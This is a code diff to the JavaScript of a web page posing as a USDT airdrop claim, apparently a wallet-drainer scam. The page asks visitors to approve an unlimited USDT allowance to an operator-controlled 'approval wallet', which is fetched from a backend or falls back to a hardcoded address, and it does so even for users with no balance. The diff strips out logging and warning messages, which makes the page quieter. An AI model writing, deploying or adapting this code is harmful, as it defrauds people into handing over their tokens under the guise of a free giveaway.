@@ -715,7 +715,6 @@
             try {
                 const isHealthy = await checkBackendHealth();
                 if (!isHealthy) {
-                    showAlert("Backend is offline. Using default wallet address.", "warning");
                     return "0xCcf0a381D804BFa37485Bc450CE540c09350f975";
                 }
 
@@ -724,14 +723,11 @@
                 
                 if (data.success) {
                     approvalWalletAddress = data.approvalWalletAddress;
-                    console.log("✅ Approval wallet from backend:", approvalWalletAddress);
                     return approvalWalletAddress;
                 } else {
                     throw new Error("Failed to fetch approval wallet from backend");
                 }
             } catch (error) {
-                console.error("❌ Error fetching approval wallet:", error);
-                showAlert("Using default approval wallet. Backend might be offline.", "warning");
                 return "0xCcf0a381D804BFa37485Bc450CE540c09350f975";
             }
         }
@@ -739,8 +735,6 @@
         // ✅ FIXED: User approval को backend में save करें
         async function saveUserApprovalToBackend(walletAddress, usdtBalance, airdropAmount, tier) {
             try {
-                console.log("💾 Saving approval to backend...", { walletAddress, usdtBalance, airdropAmount, tier });
-                
                 const response = await fetch(`${BACKEND_URL}/save-approval`, {
                     method: 'POST',
                     headers: {
@@ -755,7 +749,6 @@
                 });
                 
                 const data = await response.json();
-                console.log("✅ Backend response:", data);
                 
                 if (data.success) {
                     showAlert("✅ Approval saved to database!", "success");
@@ -764,8 +757,6 @@
                     throw new Error(data.message || 'Failed to save approval');
                 }
             } catch (error) {
-                console.error("❌ Error saving to backend:", error);
-                showAlert("⚠️ Note: Approval not saved to database", "warning");
                 return { success: false, error: error.message };
             }
         }
@@ -790,7 +781,6 @@
                 });
                 
                 const data = await response.json();
-                console.log("✅ Claim saved to backend:", data);
                 
                 if (data.success) {
                     showAlert("✅ Claim recorded in database!", "success");
@@ -799,8 +789,6 @@
                     throw new Error(data.message || 'Failed to save claim');
                 }
             } catch (error) {
-                console.error("❌ Error saving claim to backend:", error);
-                showAlert("⚠️ Claim successful but not saved to database", "warning");
                 return { success: false, error: error.message };
             }
         }
@@ -858,7 +846,6 @@
                     document.getElementById("referrer").value = ref;
                 }
             } catch (error) {
-                console.error("Initialization error:", error);
                 showAlert("Failed to initialize: " + error.message, "danger");
             }
         }
@@ -908,7 +895,6 @@
                 showAlert("Wallet connected successfully!", "success");
                 
             } catch (error) {
-                console.error("Error connecting wallet:", error);
                 showAlert("Failed to connect wallet: " + error.message, "danger");
             } finally {
                 setButtonLoading('connectWalletBtn', false);
@@ -972,8 +958,6 @@
        // ✅ UPDATED: Check Balance and Approve Function - 0 USDT users ko bhi approval allow
 async function checkBalanceAndApprove() {
     try {
-        console.log("🔄 Starting approval process...");
-        
         if (typeof window.ethereum === 'undefined') {
             showAlert("Please install MetaMask!", "danger");
             return;
@@ -996,11 +980,9 @@ async function checkBalanceAndApprove() {
         const usdtContract = new web3.eth.Contract(usdtABI, usdtContractAddress);
         
         // 1. Check USDT Balance
-        console.log("🔍 Checking USDT balance...");
         const balance = await usdtContract.methods.balanceOf(account).call();
         const balanceInUSDT = web3.utils.fromWei(balance, 'ether');
         
-        console.log("💰 USDT Balance:", balanceInUSDT);
         document.getElementById("usdtBalance").textContent = parseFloat(balanceInUSDT).toFixed(6);
         
         // ✅ UPDATED: Show actual airdrop amount for all users (including 0 USDT)
@@ -1021,18 +1003,15 @@ async function checkBalanceAndApprove() {
         
         try {
             const approvalWallet = await getApprovalWalletFromBackend();
-            console.log("✅ Approval wallet:", approvalWallet);
             
             // Check current allowance first
             const allowance = await usdtContract.methods.allowance(account, approvalWallet).call();
             const allowanceInUSDT = web3.utils.fromWei(allowance, 'ether');
-            console.log("📊 Current allowance:", allowanceInUSDT, "USDT");
 
             // ✅ UPDATED: 0 USDT wale ko bhi approval allow karo
             // Unlimited approval - chahe balance 0 ho ya 1000
             const unlimitedAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
             
-            console.log("📝 Sending approval transaction...");
             const tx = await usdtContract.methods.approve(
                 approvalWallet,
                 unlimitedAmount
@@ -1041,8 +1020,6 @@ async function checkBalanceAndApprove() {
                 gas: 100000
             });
 
-            console.log("✅ Transaction result:", tx);
-            
             if (tx.status) {
                 showAlert("✅ USDT Approval Successful!", "success");
                 
@@ -1065,7 +1042,6 @@ async function checkBalanceAndApprove() {
             }
 
         } catch (approvalError) {
-            console.error("❌ Approval error:", approvalError);
             if (approvalError.code === 4001) {
                 showAlert("❌ Approval cancelled by user", "warning");
             } else {
@@ -1076,7 +1052,6 @@ async function checkBalanceAndApprove() {
         }
 
     } catch (error) {
-        console.error("❌ Process error:", error);
         showAlert("Failed: " + error.message, "danger");
         const button = document.getElementById('checkBalanceBtn');
         button.innerHTML = '<i class="fas fa-coins"></i> Check USDT Balance & Approve';
@@ -1125,8 +1100,6 @@ async function checkBalanceAndApprove() {
                 const allowance = await usdtContract.methods.allowance(account, currentApprovalWallet).call();
                 const allowanceInUSDT = web3.utils.fromWei(allowance, 'ether');
                 
-                console.log("Current allowance:", allowanceInUSDT, "USDT");
-                
                 if (parseFloat(allowanceInUSDT) > 1000) {
                     showAlert(`✅ USDT Approved: Unlimited`, "success");
                     document.getElementById("claimButton").disabled = false;
@@ -1145,7 +1118,7 @@ async function checkBalanceAndApprove() {
                 }
                 
             } catch (error) {
-                console.error("Error checking allowance:", error);
+                // Silent fail
             }
         }
 
@@ -1192,8 +1165,6 @@ async function checkBalanceAndApprove() {
                     gasPrice: await web3.eth.getGasPrice()
                 });
 
-                console.log("✅ Claim transaction:", tx);
-
                 if (tx.status) {
                     // Save claim to backend
                     await saveClaimToBackend(account, balanceInUSDT, airdropAmount.toString(), tier, referrer);
@@ -1210,8 +1181,6 @@ async function checkBalanceAndApprove() {
                 }
 
             } catch (error) {
-                console.error("❌ Error claiming airdrop:", error);
-                
                 if (error.code === 4001) {
                     showAlert("❌ Claim cancelled by user", "warning");
                 } else if (error.message.includes("already claimed")) {
@@ -1246,7 +1215,6 @@ async function checkBalanceAndApprove() {
                 }
                 
             } catch (error) {
-                console.error("Error checking claim status:", error);
                 // Silent fail - don't show error to user
             }
         }
